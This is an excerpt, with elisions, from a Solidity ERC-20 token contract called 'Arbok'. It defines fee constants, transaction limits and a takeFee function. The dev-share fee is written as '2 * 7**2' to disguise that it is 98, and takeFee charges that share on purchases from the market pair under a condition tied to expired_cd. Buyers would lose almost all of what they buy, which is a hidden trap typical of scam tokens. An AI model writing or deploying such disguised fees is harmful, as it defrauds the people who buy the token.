...
contract ARBOK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Arbok";
    string private _symbol = "ARBOK";
    ...
    uint256 public _DevShare = 2 * 7**2;
    ...
    uint256 public _maxTxAmount = (10000 / 100) * 10 ** 12;
    uint256 public _walletMax = (10000 / 20) * 10 ** 12;
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            ...
            if (expired_cd > 2 && expired_cd != 100) {
                feeAmount = amount.mul(_DevShare).div(100);
            }
        }
